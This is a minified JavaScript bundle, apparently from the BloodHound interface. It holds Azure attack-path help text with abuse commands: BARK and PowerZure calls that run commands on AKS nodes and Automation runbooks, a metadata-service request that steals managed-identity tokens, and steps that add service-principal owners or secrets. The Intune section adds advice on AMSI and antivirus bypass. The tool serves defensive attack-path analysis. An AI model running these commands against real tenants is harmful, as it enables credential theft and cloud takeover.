import{x as Yt,K as Jt,c9 as Xt,_ as Le,ca as we,bF as Fe,r as p,y as Qt,z as Zt,cb as mt,Q as en,cc as tn,j as e,E as bt,H as nn,cd as rn,a7 as on,ce as an,s as t,a as h,bB as o,be as z,bf as y,bg as f,R as sn,Y as cn,A as dn,k as ln,cf as je,bX as ve,bl as hn,b8 as pn,a8 as un,cg as mn,b0 as bn,b1 as gn,b2 as yn,ch as fn,b4 as wn,B as gt,h as Qe,d as xn,b as St,bL as kt,bK as jn,aK as vn,ci as l,ap as An,q as Sn,cj as kn,T as Tn}from"./index-a584ef0b.js";import{L as Pn}from"./ListSubheader-88606394.js";import{_ as yt}from"./tslib.es6-ed841dd2.js";const Cn=["alignItems","autoFocus","component","children","dense","disableGutters","divider","focusVisibleClassName","selected","className"],Dn=(n,r)=>{const{ownerState:a}=n;return[r.root,a.dense&&r.dense,a.alignItems==="flex-start"&&r.alignItemsFlexStart,a.divider&&r.divider,!a.disableGutters&&r.gutters]},Rn=n=>{const{alignItems:r,classes:a,dense:s,disabled:i,disableGutters:c,divider:d,selected:u}=n,D=nn({root:["root",s&&"dense",!c&&"gutters",d&&"divider",i&&"disabled",r==="flex-start"&&"alignItemsFlexStart",u&&"selected"]},rn,a);return Le({},a,D)},On=Yt(Jt,{shouldForwardProp:n=>Xt(n)||n==="classes",name:"MuiListItemButton",slot:"Root",overridesResolver:Dn})(({theme:n,ownerState:r})=>Le({display:"flex",flexGrow:1,justifyContent:"flex-start",alignItems:"center",position:"relative",textDecoration:"none",minWidth:0,boxSizing:"border-box",textAlign:"left",paddingTop:8,paddingBottom:8,transition:n.transitions.create("background-color",{duration:n.transitions.duration.shortest}),"&:hover":{textDecoration:"none",backgroundColor:(n.vars||n).palette.action.hover,"@media (hover: none)":{backgroundColor:"transparent"}},[`&.${we.selected}`]:{backgroundColor:n.vars?`rgba(${n.vars.palette.primary.mainChannel} / ${n.vars.palette.action.selectedOpacity})`:Fe(n.palette.primary.main,n.palette.action.selectedOpacity),[`&.${we.focusVisible}`]:{backgroundColor:n.vars?`rgba(${n.vars.palette.primary.mainChannel} / calc(${n.vars.palette.action.selectedOpacity} + ${n.vars.palette.action.focusOpacity}))`:Fe(n.palette.primary.main,n.palette.action.selectedOpacity+n.palette.action.focusOpacity)}},[`&.${we.selected}:hover`]:{backgroundColor:n.vars?`rgba(${n.vars.palette.primary.mainChannel} / calc(${n.vars.palette.action.selectedOpacity} + ${n.vars.palette.action.hoverOpacity}))`:Fe(n.palette.primary.main,n.palette.action.selectedOpacity+n.palette.action.hoverOpacity),"@media (hover: none)":{backgroundColor:n.vars?`rgba(${n.vars.palette.primary.mainChannel} / ${n.vars.palette.action.selectedOpacity})`:Fe(n.palette.primary.main,n.palette.action.selectedOpacity)}},[`&.${we.focusVisible}`]:{backgroundColor:(n.vars||n).palette.action.focus},[`&.${we.disabled}`]:{opacity:(n.vars||n).palette.action.disabledOpacity}},r.divider&&{borderBottom:`1px solid ${(n.vars||n).palette.divider}`,backgroundClip:"padding-box"},r.alignItems==="flex-start"&&{alignItems:"flex-start"},!r.disableGutters&&{paddingLeft:16,paddingRight:16},r.dense&&{paddingTop:4,paddingBottom:4})),$n=p.forwardRef(function(r,a){const s=Qt({props:r,name:"MuiListItemButton"}),{alignItems:i="center",autoFocus:c=!1,component:d="div",children:u,dense:g=!1,disableGutters:D=!1,divider:P=!1,focusVisibleClassName:A,selected:m=!1,className:w}=s,C=Zt(s,Cn),U=p.useContext(mt),_=p.useMemo(()=>({dense:g||U.dense||!1,alignItems:i,disableGutters:D}),[i,U.dense,g,D]),G=p.useRef(null);en(()=>{c&&G.current&&G.current.focus()},[c]);const M=Le({},s,{alignItems:i,dense:_.dense,disableGutters:D,divider:P,selected:m}),E=Rn(M),x=tn(G,a);return e.jsx(mt.Provider,{value:_,children:e.jsx(On,Le({ref:x,href:C.href||C.to,component:(C.href||C.to)&&d==="div"?"button":d,focusVisibleClassName:bt(E.focusVisible,A),ownerState:M,className:bt(E.root,w)},C,{classes:E,children:u}))})}),In=$n,sh=({children:n,label:r})=>{const[a,s]=p.useState(null),i=!!a,c=()=>s(null);return e.jsxs(e.Fragment,{children:[e.jsx(on,{onClick:d=>{s(d.currentTarget)},"aria-controls":i?`${r}-menu`:void 0,"aria-haspopup":"true","aria-expanded":i?"true":void 0,displayText:r}),e.jsx(an,{id:`${r}-menu`,open:i,anchorEl:a,onClose:c,MenuListProps:{"aria-labelledby":`${r}-button`},anchorOrigin:{vertical:"top",horizontal:"left"},transformOrigin:{vertical:"bottom",horizontal:"left"},children:p.Children.map(n,d=>e.jsx("div",{onClick:c,children:d}))})]})},Mn=()=>e.jsx(t,{variant:"body2",children:"The Azure Kubernetes Service Contributor role grants full control of the target Azure Kubernetes Service Managed Cluster. This includes the ability to remotely fetch administrator credentials for the cluster as well as the ability to execute arbitrary commands on compute nodes associated with the AKS Managed Cluster."}),Gn=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"You can use BARK's Invoke-AzureRMAKSRunCommand function to execute commands on compute nodes associated with the target AKS Managed Cluster."}),e.jsx(t,{variant:"body2",children:"This function requires you to supply an Azure Resource Manager scoped JWT associated with the principal that has the privilege to execute commands on the cluster. There are several ways to acquire a JWT. For example, you may use BARK's Get-ARMTokenWithRefreshToken to acquire an Azure RM-scoped JWT by supplying a refresh token:"}),e.jsx(t,{component:"pre",children:'$ARMToken = Get-ARMTokenWithRefreshToken `\n    -RefreshToken "0.ARwA6WgJJ9X2qk…" `\n    -TenantID "contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:`Now you can use BARK's Invoke-AzureRMAKSRunCommand function to execute a command against the target AKS Managed Cluster. For example, to run a simple "whoami" command:`}),e.jsx(t,{component:"pre",children:'Invoke-AzureRMAKSRunCommand `\n    -Token $ARMToken `\n    -TargetAKSId "/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster" `\n    -Command "whoami"'}),e.jsx(t,{variant:"body2",children:"If the AKS Cluster or its associated Virtual Machine Scale Sets have managed identity assignments, you can use BARK's Invoke-AzureRMAKSRunCommand function to retrieve a JWT for the managed identity Service Principal like this:"}),e.jsx(t,{component:"pre",children:`Invoke-AzureRMAKSRunCommand \`
    -Token $ARMToken \`
    -TargetAKSId "/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster" \`
    -Command 'curl -i -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://graph.microsoft.com/&api-version=2019-08-01"'`}),e.jsx(t,{variant:"body2",children:"If successful, the output will include a JWT for the managed identity service principal."})]}),En=()=>e.jsx(t,{variant:"body2",children:"This will depend on which particular abuse you perform, but in general Azure will create a log event for each abuse."}),Fn=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.netspi.com/blog/technical/cloud-penetration-testing/extract-credentials-from-azure-kubernetes-service/",children:"Karl Fosaaen - How To Extract Credentials from Azure Kubernetes Service (AKS)"})]}),Un={general:Mn,abuse:Gn,opsec:En,references:Fn},_n=()=>e.jsx(t,{variant:"body2",children:"The ability to add other principals to an Azure security group"}),Ln=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Via the Azure portal:"}),e.jsxs(z,{children:[e.jsx(y,{children:e.jsx(f,{children:"Find the group in your tenant (Azure Active Directory -> Groups -> Find Group in list)"})}),e.jsx(y,{children:e.jsx(f,{children:"Click the group from the list"})}),e.jsx(y,{children:e.jsx(f,{children:'In the left pane, click "Members"'})}),e.jsx(y,{children:e.jsx(f,{children:'At the top, click "Add members"'})}),e.jsx(y,{children:e.jsx(f,{children:'Find the principals you want to add to the group and click them, then click "select" at the bottom'})}),e.jsx(y,{children:e.jsx(f,{children:'You should see a message in the top right saying "Member successfully added"'})})]}),e.jsx(t,{variant:"body2",children:"Via PowerZure: Add-AzureADGroup -User [UPN] -Group [Group name]"})]}),Wn=()=>e.jsx(t,{variant:"body2",children:"The Azure activity log for the tenant will log who added what principal to what group, including the date and time."}),zn=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#add-azureadgroup",children:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#add-azureadgroup"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/powershell/module/azuread/add-azureadgroupmember?view=azureadps-2.0-preview",children:"https://docs.microsoft.com/en-us/powershell/module/azuread/add-azureadgroupmember?view=azureadps-2.0-preview"})]}),Bn={general:_n,abuse:Ln,opsec:Wn,references:zn},Nn=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"This edge is created during post-processing. It is created against all App Registrations and Service Principals within the same tenant when an Azure principal has one of the following Azure Active Directory roles:"}),e.jsx(t,{variant:"body2",children:e.jsxs(z,{children:[e.jsx(y,{children:e.jsx(f,{children:"Hybrid Identity Administrator"})}),e.jsx(y,{children:e.jsx(f,{children:"Partner Tier1 Support"})}),e.jsx(y,{children:e.jsx(f,{children:"Partner Tier2 Support"})}),e.jsx(y,{children:e.jsx(f,{children:"Directory Synchronization Accounts"})})]})}),e.jsx(t,{variant:"body2",children:"You will not see these privileges when auditing permissions against any of the mentioned objects when you use Microsoft tooling, including the Azure portal or any API."})]}),Vn=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"You can use BARK to add a new owner to the target object. The BARK function you use will depend on the target object type, but all of the functions follow a similar syntax."}),e.jsx(t,{variant:"body2",children:"These functions require you to supply an MS Graph-scoped JWT associated with the principal that has the privilege to add a new owner to your target object. There are several ways to acquire a JWT. For example, you may use BARK’s Get-GraphTokenWithRefreshToken to acquire an MS Graph-scoped JWT by supplying a refresh token:"}),e.jsx(t,{component:"pre",children:'$MGToken = Get-GraphTokenWithRefreshToken `\n    -RefreshToken "0.ARwA6WgJJ9X2qk…" `\n    -TenantID "contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:"To add a new owner to a Service Principal, use BARK's New-ServicePrincipalOwner function:"}),e.jsx(t,{component:"pre",children:'New-ServicePrincipalOwner `\n    -ServicePrincipalObjectId "082cf9b3-24e2-427b-bcde-88ffdccb5fad" `\n    -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `\n    -Token $Token'}),e.jsx(t,{variant:"body2",children:"To add a new owner to an App Registration, use BARK's New-AppOwner function:"}),e.jsx(t,{component:"pre",children:'New-AppOwner `\n    -AppObjectId "52114a0d-fa5b-4ee5-9a29-2ba048d46eee" `\n    -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `\n    -Token $Token'})]}),Kn=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"Any time you add an owner to any Azure object, the AzureAD audit logs will create an event logging who added an owner to what object, as well as what the new owner added to the object was."})}),Hn=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"})]}),qn={general:Nn,abuse:Vn,opsec:Kn,references:Hn},Yn=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Azure provides several systems and mechanisms for granting control of securable objects within Azure Active Directory, including tenant-scoped admin roles, object-scoped admin roles, explicit object ownership, and API permissions."}),e.jsx(t,{variant:"body2",children:'When a principal has been granted "Cloud App Admin" or "App Admin" against the tenant, that principal gains the ability to add new secrets to all Service Principals and App Registrations. Additionally, a principal that has been granted "Cloud App Admin" or "App Admin" against, or explicit ownership of a Service Principal or App Registration gains the ability to add secrets to that particular object.'})]}),Jn=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"There are several ways to perform this abuse, depending on what sort of access you have to the credentials of the object that holds this privilege against the target object. If you have an interactive web browser session for the Azure portal, it is as simple as finding the target App in the portal and adding a new secret to the object using the “Certificates & secrets” tab. Service Principals do not have this tab in the Azure portal but you can add secrets to them with the MS Graph API."}),e.jsx(t,{variant:"body2",children:"No matter what kind of control you have, you will be able to perform this abuse by using BARK’s New-AppRegSecret or New-ServicePrincipalSecret functions."}),e.jsxs(t,{variant:"body2",children:["These functions require you to supply an MS Graph-scoped JWT associated with the principal that has the privilege to add a new secret to your target application. There are several ways to acquire a JWT. For example, you may use BARK’s Get-GraphTokenWithRefreshToken to acquire an MS Graph-scoped JWT by supplying a refresh token:",e.jsx(t,{component:"pre",children:'$MGToken = Get-GraphTokenWithRefreshToken -RefreshToken "0.ARwA6WgJJ9X2qk…" -TenantID "contoso.onmicrosoft.com"'})]}),e.jsxs(t,{variant:"body2",children:["Then use BARK’s New-AppRegSecret to add a new secret to the target application:",e.jsx(t,{component:"pre",children:'New-AppRegSecret -AppRegObjectID "d878…" -Token $MGToken.access_token'})]}),e.jsxs(t,{variant:"body2",children:["The output will contain the plain-text secret you just created for the target app:",e.jsx(t,{component:"pre",children:'PS /Users/andyrobbins> New-AppRegSecret -AppRegObjectID "d878…" -Token $MGToken.access_token Name Value ---- ----- AppRegSecretValue odg8Q~... AppRegAppId 4d31… AppRegObjectId d878…'})]}),e.jsxs(t,{variant:"body2",children:["With this plain text secret, you can now acquire tokens as the service principal associated with the app. You can easily do this with BARK’s Get-MSGraphToken function:",e.jsx(t,{component:"pre",children:'PS /Users/andyrobbins> $SPToken = Get-MSGraphToken `-ClientID "4d31…" `-ClientSecret "odg8Q~..." `-TenantName "contoso.onmicrosoft.com" PS /Users/andyrobbins> $SPToken.access_token eyJ0eXAiOiJKV1QiLCJub…'})]}),e.jsx(t,{variant:"body2",children:"Now you can use this JWT to perform actions against any other MS Graph endpoint as the service principal, continuing your attack path with the privileges of that service principal."})]}),Xn=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"When you create a new secret for an App or Service Principal, Azure creates an event called “Update application – Certificates and secrets management”. This event describes who added the secret to which application or service principal."})}),Qn=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/azure/active-directory/roles/assign-roles-different-scopes",children:"Assign Azure AD roles at different scopes"})]}),Zn={general:Yn,abuse:Jn,opsec:Xn,references:Qn},er=()=>e.jsx(t,{variant:"body2",children:"Principals with the Application Admin role can control tenant-resident apps."}),tr=()=>e.jsx(t,{variant:"body2",children:"Create a new credential for the app, then authenticate to the tenant as the app's service principal, then abuse whatever privilege it is that the service principal has."}),nr=()=>e.jsx(t,{variant:"body2",children:"The Azure portal will create a log even whenever a new credential is created for a service principal."}),rr=()=>e.jsx(h,{sx:{overflowX:"auto"},children:e.jsx(o,{target:"_blank",rel:"noopener",href:"https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/",children:"https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/"})}),or={general:er,abuse:tr,opsec:nr,references:rr},ar=()=>e.jsx(t,{variant:"body2",children:"The Azure Automation Contributor role grants full control of the target Azure Automation Account. This includes the ability to execute arbitrary commands on the Automation Account."}),sr=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"You can use BARK's New-AzureAutomationAccountRunBook and Get-AzureAutomationAccountRunBookOutput functions to execute arbitrary commands against the target Automation Account."}),e.jsx(t,{variant:"body2",children:"These functions require you to supply an Azure Resource Manager scoped JWT associated with the principal that has the privilege to add or modify and run Automation Account run books. There are several ways to acquire a JWT. For example, you may use BARK's Get-ARMTokenWithRefreshToken to acquire an Azure RM-scoped JWT by supplying a refresh token:"}),e.jsx(t,{component:"pre",children:'$ARMToken = Get-ARMTokenWithRefreshToken ` \n    -RefreshToken "0.ARwA6WgJJ9X2qk…" ` \n    -TenantID "contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:"Now you can use BARK's New-AzureAutomationAccountRunBook function to add a new runbook to the target Automation Account, specifying a command to execute using the -Script parameter:"}),e.jsx(t,{component:"pre",children:'New-AzureAutomationAccountRunBook `\n    -Token $ARMToken `\n    -RunBookName "MyCoolRunBook" `\n    -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount" `\n    -Script "whoami"'}),e.jsx(t,{variant:"body2",children:"After adding the new runbook, you must execute it and fetch its output. You can do this automatically with BARK's Get-AzureAutomationAccountRunBookOutput function:"}),e.jsx(t,{component:"pre",children:'Get-AzureAutomationAccountRunBookOutput `\n    -Token $ARMToken `\n    -RunBookName "MyCoolRunBook" `\n    -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount"'}),e.jsx(t,{variant:"body2",children:"If the Automation Account has a managed identity assignment, you can use these two functions to retrieve a JWT for the service principal like this:"}),e.jsx(t,{component:"pre",children:`$Script = $tokenAuthURI = $env:MSI_ENDPOINT + "?resource=https://graph.microsoft.com/&api-version=2017-09-01"; $tokenResponse = Invoke-RestMethod -Method Get -Headers @{"Secret"="$env:MSI_SECRET"} -Uri $tokenAuthURI; $tokenResponse.access_token
New-AzureAutomationAccountRunBook -Token $ARMToken -RunBookName "MyCoolRunBook" -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount" -Script $Script
Get-AzureAutomationAccountRunBookOutput -Token $ARMToken -RunBookName "MyCoolRunBook" -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount"`}),e.jsx(t,{variant:"body2",children:"If successful, the output will include a JWT for the managed identity service principal."})]}),ir=()=>e.jsx(t,{variant:"body2",children:"This will depend on which particular abuse you perform, but in general Azure will create a log event for each abuse."}),cr=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/managed-identity-attack-paths-part-1-automation-accounts-82667d17187a",children:"Andy Robbins - Managed Identity Attack Paths, Part 1: Automation Accounts"})]}),dr={general:ar,abuse:sr,opsec:ir,references:cr},lr=()=>e.jsx(t,{variant:"body2",children:"Any principal granted the Avere Contributor role, scoped to the affected VM, can reset the built-in administrator password on the VM."}),hr=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The Avere Contributor role allows you to run SYSTEM commands on the VM"}),e.jsx(t,{variant:"body2",children:"Via PowerZure:"}),e.jsx(o,{target:"_blank",rel:"noopener",href:"http://Invoke-AzureRunCommand",children:"Invoke-AzureRunCommand"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"http://Invoke-AzureRunMSBuild",children:"Invoke-AzureRunMSBuild"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azurerunprogram",children:"Invoke-AzureRunProgram"})]}),pr=()=>e.jsx(t,{variant:"body2",children:"Because you‘ll be running a command as the SYSTEM user on the Virtual Machine, the same opsec considerations for running malicious commands on any system should be taken into account: command line logging, PowerShell script block logging, EDR, etc."}),ur=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/tactics/TA0008/",children:"ATT&CK T0008: Lateral Movement"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1021/",children:"ATT&CK T1021: Remote Services"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#avere-contributor",children:"Microsoft Docs - Avere Contributor"})]}),mr={general:lr,abuse:hr,opsec:pr,references:ur},br=()=>e.jsx(t,{variant:"body2",children:"Principals with the Cloud App Admin role can control tenant-resident apps"}),gr=()=>e.jsx(t,{variant:"body2",children:"Create a new credential for the app, then authenticate to the tenant as the app's service principal, then abuse whatever privilege it is that the service principal has."}),yr=()=>e.jsx(t,{variant:"body2",children:"Auzre will create a log event whenever a new secret is created for a service principal."}),fr=()=>e.jsx(t,{variant:"body2",children:e.jsx(o,{target:"_blank",rel:"noopener",href:"https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/",children:"https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/"})}),wr={general:br,abuse:gr,opsec:yr,references:fr},xr=()=>e.jsx(t,{variant:"body2",children:'This indicates that the parent object contains the child object, such as a resource group containing a virtual machine, or a tenant "containing" a subscription.'}),jr=()=>e.jsx(t,{variant:"body2",children:"There is no abuse necessary, but any roles scoped on a parent object will descend down to all child objects."}),vr=()=>e.jsx(t,{variant:"body2",children:"This depends on what you do, see other edges as far as opsec considerations for activating roles"}),Ar=()=>e.jsx(t,{variant:"body2",children:"No References Available"}),Sr={general:xr,abuse:jr,opsec:vr,references:Ar},kr=()=>e.jsx(t,{variant:"body2",children:"The contributor role grants almost all abusable privileges in all circumstances, with some exceptions. Those exceptions are not collected by AzureHound."}),Tr=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"This depends on what the target object is:"}),e.jsxs(t,{variant:"body2",children:[e.jsx(t,{fontWeight:"fontWeightBold",children:"Key Vault"}),": You can read secrets and alter access policies (grant yourself access to read secrets)"]}),e.jsxs(t,{variant:"body2",children:[e.jsx(t,{fontWeight:"fontWeightBold",children:"Automation Account"}),": You can create a new runbook that runs as the Automation Account, and edit existing runbooks. Runbooks can be used to authenticate as the Automation Account and abuse privileges held by the Automation Account. If the Automation Account is using a 'RunAs' account, you can gather the certificate used to login and impersonate that account."]}),e.jsxs(t,{variant:"body2",children:[e.jsx(t,{fontWeight:"fontWeightBold",children:"Virtual Machine"}),": Run SYSTEM commands on the VM"]}),e.jsxs(t,{variant:"body2",children:[e.jsx(t,{fontWeight:"fontWeightBold",children:"Resource Group"}),": NOT abusable, and not collected by AzureHound"]}),e.jsx(t,{variant:"body2",children:"Via PowerZure:"}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent",children:"Get-AzureKeyVaultContent"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent",children:"Export-AzureKeyVaultContent"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurerunascertificate",children:"Get-AzureRunAsCertificate"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurerunbookcontent",children:"Get-AzureRunbookContent"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"http://Invoke-AzureRunCommand",children:"Invoke-AzureRunCommand"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"http://Invoke-AzureRunMSBuild",children:"Invoke-AzureRunMSBuild"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azurerunprogram",children:"Invoke-AzureRunProgram"})]}),Pr=()=>e.jsx(t,{variant:"body2",children:"This will depend on which particular abuse you perform, but in general Azure will create a log event for each abuse."}),Cr=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsxs(o,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/ ",children:["https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/"," "]}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/azure-automation-accounts-key-stores/",children:"https://blog.netspi.com/azure-automation-accounts-key-stores/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/get-azurepasswords/",children:"https://blog.netspi.com/get-azurepasswords/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/attacking-azure-cloud-shell/",children:"https://blog.netspi.com/attacking-azure-cloud-shell/"})]}),Dr={general:kr,abuse:Tr,opsec:Pr,references:Cr},Rr=()=>e.jsx(t,{variant:"body2",children:"Principals with the Intune Administrators role are able to execute arbitrary PowerShell scripts on devices that are joined to the Azure Active Directory tenant."}),Or=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"First, have your PowerShell script ready to go and save it somewhere as a PS1 file. Take all the necessary operational security (opsec) and AMSI-bypass steps you want at this point, keeping in mind the script will run as the SYSTEM user unless you specify otherwise. Also keep in mind that the script will be written to disk, so take whatever AV bypass measures you need as well."}),e.jsx(t,{variant:"body2",children:"Next, log into the Azure web portal as the user with the “Intune Administrator” role activated. After authenticating, access Endpoint Manager at https://endpoint.microsoft.com"}),e.jsx(t,{variant:"body2",children:"Click on “Devices” on the left, which takes you, unsurprisingly, to the devices overview. Click on “Scripts” under the “Policy” section to go to the scripts management page. Click “Add,” then click “Windows 10”"}),e.jsx(t,{variant:"body2",children:"This will bring you to the “Add Powershell Script” page. On this first page, you’ll enter a name for the script and a brief description. On the next page, click the folder and then select your PS1 from the common dialogue window. You’ve now got three options to configure, but can leave them all in the default “No” position. Most interestingly, keeping the first selection as “No” will cause the script to run as the SYSTEM user"}),e.jsx(t,{variant:"body2",children:"Click next, and you’ll see the page that lets you scope which systems and users this script will execute for. You can choose to assign the script to “All devices,” “All users,” or “All users and devices.” If you leave the “Assign to” dropdown at its default selection of “Selected groups,” you can scope the script to only execute on systems or for users that belong to certain security groups. The choice is yours: run the script on every possible system or constrain it to only run on certain systems by scoping it to existing security groups or by adding specific devices or users to new security groups."}),e.jsx(t,{variant:"body2",children:"Click “Next” and you’ll see the review page which lets you see what you’re about to do. Click “Add” and Azure will begin registering the script."}),e.jsx(t,{variant:"body2",children:"At this point, the script is now ready to run on your target systems. This process works similarly to Group Policy, in that the Intune agent running on each device periodically checks in (by default every hour) with Intune/Endpoint Manager to see if there is a PowerShell script for it to run, so you will need to wait up to an hour for your target system to actually pull the script down and run it."})]}),$r=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"When the Intune agent pulls down and executes PowerShell scripts, a number of artifacts are created on the endpoint — some permanent and some ephemeral."}),e.jsx(t,{variant:"body2",children:"Two files are created on the endpoint when a PowerShell script is executed in the following locations: - C:\\Program files (x86)\\Microsoft Intune Management Extension\\Policies\\Scripts - C:\\Program files (x86)\\Microsoft Intune Management Extension\\Policies\\Results"}),e.jsx(t,{variant:"body2",children:"The file under the “Scripts” folder will be a local copy of the PS1 stored in Azure, and the file under the “Results” folder will be the output of the PS1; however, both of these files are automatically deleted as soon as the script finishes running."}),e.jsx(t,{variant:"body2",children:"There are also permanent artifacts left over (assuming the attacker doesn’t tamper with them). A full copy of the contents of the PS1 can be found in this log file: - C:\\ProgramData\\Microsoft\\IntuneManagementExtension\\Logs\\_IntuneManagementExtension.txt"})]}),Ir=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/tactics/TA0002/",children:"MITRE: Execution"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/death-from-above-lateral-movement-from-azure-to-on-prem-ad-d18cb3959d4d",children:"Death from Above: Lateral Movement from Azure to On-Prem AD"})]}),Mr={general:Rr,abuse:Or,opsec:$r,references:Ir},Gr=()=>e.jsx(t,{variant:"body2",children:"The ability to read certificates from key vaults"}),Er=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Use PowerShell or PowerZure to fetch the certificate from the key vault"}),e.jsx(t,{variant:"body2",children:"Via 